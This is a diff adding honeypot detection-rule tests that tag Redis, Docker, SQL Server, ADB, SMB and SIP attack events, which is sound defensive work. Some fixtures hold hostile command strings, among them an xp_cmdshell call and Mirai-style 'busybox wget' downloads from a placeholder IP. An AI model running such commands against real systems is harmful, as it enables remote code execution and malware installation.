@@ -5,6 +5,7 @@ from pathlib import Path
 from typing import Any
 
 import pytest
+from suckerpot_common import SensorName
 
 from ingest.tagging import RuleError, RuleSet, glob_match, load_rules
 from ingest.tagging.engine import command_words
@@ -35,6 +36,79 @@ def cmd(text: str, sensor: str = "ssh") -> tuple[str, str, dict[str, Any]]:
 def http(method: str, path: str, **extra: Any) -> tuple[str, str, dict[str, Any]]:
     return ("http_request", "web", {"method": method, "path": path, **extra})
 
+
+def flagged(
+    sensor: str, flags: list[str], etype: str = "scan", **extra: Any
+) -> tuple[str, str, dict[str, Any]]:
+    return (etype, sensor, {"flags": flags, **extra})
+
+
+Case = tuple[str, str, dict[str, Any]]
+SERVICE_POSITIVE: dict[str, list[Case]] = {
+    "redis-persistence": [flagged("redis", ["cron_write"], "command"), flagged("redis", ["cron_payload"], "command"),
+                          flagged("redis", ["ssh_key_payload"], "command"),
+                          flagged("redis", ["config_set_dir", "ssh_key_write"], "command")],
+    "redis-rogue-master": [flagged("redis", ["slaveof"], "command"),
+                           flagged("redis", ["module_load"], "command")],
+    "docker-miner": [flagged("docker", ["container_create", "miner"], "http_request")],
+    "docker-container-escape": [flagged("docker", ["privileged"], "http_request"),
+                                flagged("docker", ["host_mount"], "http_request"),
+                                flagged("docker", ["docker_sock_mount"], "command")],
+    "sql-rce": [flagged("mssql", ["xp_cmdshell"], "command"), flagged("mssql", ["sp_oacreate"], "command"),
+                cmd("EXEC master..xp_cmdshell 'whoami'", "mssql"),
+                cmd("select sp_OACreate 1", "mssql"), flagged("mysql", ["udf"], "command"),
+                flagged("mssql", ["lolbin"], "command"), flagged("mssql", ["shell_command"], "command"), flagged("mysql", ["xp_cmdshell"], "command")],
+    "db-ransom": [flagged("mysql", ["drop_database"], "command"), flagged("mssql", ["ransom_note"], "command"),
+                  flagged("redis", ["ransom_note"], "command")],
+    "service-download-drop": [
+        ("download_attempt", "redis", {"url": "http://x/a"}), ("download_attempt", "mssql", {"url": "http://x/a"}),
+        ("download_attempt", "docker", {"url": "http://x/a"}), ("download_attempt", "adb", {"url": "http://x/a"}),
+    ],
+    "adb-malware-drop": [flagged("adb", ["adb_push"], "command"), flagged("adb", ["adb_install"], "command")],
+    "adb-mirai": [("command", "adb", {"flags": ["adb_shell"], "input": "busybox wget http://198.51.100.9/x"}),
+                  ("command", "adb", {"flags": ["adb_shell"], "input": "cd /data/local/tmp; busybox ECCHI"})],
+    "adb-mirai-download": [("download_attempt", "adb", {"url": "http://198.51.100.9/x", "command": "busybox wget http://198.51.100.9/x"})],
+    "smb-eternalblue": [
+        flagged("smb", ["eternalblue"]), flagged("smb", ["smbv1", "ms17_010"]),
+        ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "trans2", "flags": ["smbv1"]}),
+        ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "nt_transact", "flags": ["smbv1"]}),
+        ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "trans", "flags": ["smbv1"]}),
+    ],
+    "redis-miner": [flagged("redis", ["miner"], "command"), flagged("redis", ["kinsing", "dropper"], "command")],
+    "sip-fraud": [flagged("sip", ["invite"]), flagged("sip", ["register"]), flagged("sip", ["toll_fraud"])],
+    "sip-options-scan": [flagged("sip", ["options_scan"]), flagged("sip", ["scanner_ua", "response"])],
+}  # fmt: skip
+SERVICE_NEGATIVE: dict[str, list[Case]] = {
+    "redis-persistence": [flagged("redis", ["config_set_dir"], "command"), flagged("ssh", ["cron_write"], "command"),
+                          flagged("web", ["ssh_key_write"], "http_request")],
+    "redis-rogue-master": [flagged("redis", ["config_set_dir"], "command"), flagged("mysql", ["slaveof"], "command")],
+    "docker-miner": [flagged("docker", ["container_create"], "http_request"), flagged("ssh", ["miner"], "command")],
+    "docker-container-escape": [flagged("docker", ["container_create", "image:alpine"], "http_request"),
+                                flagged("redis", ["privileged"], "command")],
+    "sql-rce": [cmd("select 1", "mssql"), flagged("mssql", ["into_outfile"], "command"),
+                cmd("xp_cmdshell whoami", "ssh"), flagged("redis", ["xp_cmdshell"], "command")],
+    "db-ransom": [flagged("mysql", ["into_outfile"], "command"), flagged("sip", ["drop_database"]),
+                  flagged("web", ["ransom_note"], "http_request")],
+    "service-download-drop": [
+        ("download_attempt", "ssh", {"url": "http://x/a"}), ("command", "redis", {"input": "SET a b"}),
+        ("download_attempt", "sip", {"url": "http://x/a"}),
+    ],
+    "adb-malware-drop": [flagged("adb", ["adb_shell"], "command"), flagged("ssh", ["adb_push"], "command")],
+    "adb-mirai": [("command", "adb", {"flags": ["adb_shell"], "input": "getprop ro.product.model"}),
+                  ("command", "ssh", {"flags": ["adb_shell"], "input": "busybox x"})],
+    "adb-mirai-download": [("download_attempt", "adb", {"url": "http://x/y", "command": "curl http://x/y"}),
+                           ("download_attempt", "ssh", {"command": "busybox wget x"})],
+    "smb-eternalblue": [
+        flagged("smb", ["smbv1", "null_session"]), flagged("ssh", ["eternalblue"]),
+        ("scan", "smb", {"kind": "smb1_negotiate", "smb1_outcome": "reset", "flags": ["smbv1"]}),
+        ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "session_setup_andx", "flags": ["smbv1"]}),
+        ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "negotiate", "flags": ["smbv1"]}),
+        ("scan", "ssh", {"kind": "smb1_command", "smb1_command_name": "trans2"}),
+    ],
+    "redis-miner": [flagged("redis", ["download"], "command"), flagged("docker", ["miner"], "command")],
+    "sip-fraud": [flagged("sip", ["options_scan"]), flagged("web", ["invite"], "http_request")],
+    "sip-options-scan": [flagged("sip", ["invite"]), flagged("smb", ["options_scan"])],
+}  # fmt: skip
 
 POSITIVE: dict[str, list[tuple[str, str, dict[str, Any]]]] = {
     "recon-commands": [
@@ -75,6 +149,7 @@ POSITIVE: dict[str, list[tuple[str, str, dict[str, Any]]]] = {
         http("GET", "/", user_agent="Mozilla/5.0 zgrab/0.x"), http("GET", "/", user_agent="masscan/1.3"),
         http("GET", "/", user_agent="Nmap Scripting Engine"), http("GET", "/", user_agent="Nuclei - Open-source"),
     ],
+    **SERVICE_POSITIVE,
 }  # fmt: skip
 
 NEGATIVE: dict[str, list[tuple[str, str, dict[str, Any]]]] = {
@@ -95,6 +170,7 @@ NEGATIVE: dict[str, list[tuple[str, str, dict[str, Any]]]] = {
                        http("GET", "/envfile")],
     "scanner-user-agent": [http("GET", "/", user_agent="Mozilla/5.0 (X11; Linux) Firefox/130"),
                            http("GET", "/", user_agent="curl/8.5.0"), http("GET", "/")],
+    **SERVICE_NEGATIVE,
 }  # fmt: skip
 
 
@@ -121,6 +197,24 @@ def test_session_rules() -> None:
     assert not session_fires("scanner-reputation")
 
 
+@pytest.mark.parametrize("sensor", [n.value for n in SensorName])
+def test_credential_stuffing_applies_to_every_sensor(sensor: str) -> None:
+    assert session_fires(
+        "credential-stuffing", **{"session.sensor": sensor, "session.login_attempts": 25}
+    )
+
+
+def test_new_sensor_flags_end_to_end() -> None:
+    assert ALL.tag_event(
+        "command", "adb", {"flags": ["adb_shell", "adb_push"], "input": "busybox wget x"}
+    ) == [
+        "malware-drop",
+        "mirai",
+    ]
+    assert ALL.tag_event("scan", "sip", {"flags": ["options_scan"]}) == ["scanner"]
+    assert ALL.tag_event("command", "redis", {"flags": ["cron_write"]}) == ["persistence"]
+
+
 def test_every_shipped_rule_has_examples() -> None:
     event_ids = {r.id for r in ALL.event_rules}
     assert event_ids == set(POSITIVE) == set(NEGATIVE)
@@ -135,7 +229,8 @@ def test_required_tags_exist() -> None:
     assert {
         "recon", "mirai", "crypto-miner", "malware-drop", "persistence", "php2shell",
         "wordpress-bruteforce", "phpmyadmin-bruteforce", "credential-stuffing", "scanner",
-        "env-file-probe",
+        "env-file-probe", "redis-rogue-master", "container-escape", "sql-rce", "db-ransom",
+        "eternalblue", "sip-fraud",
     } <= set(ALL.tags)  # fmt: skip
 
 
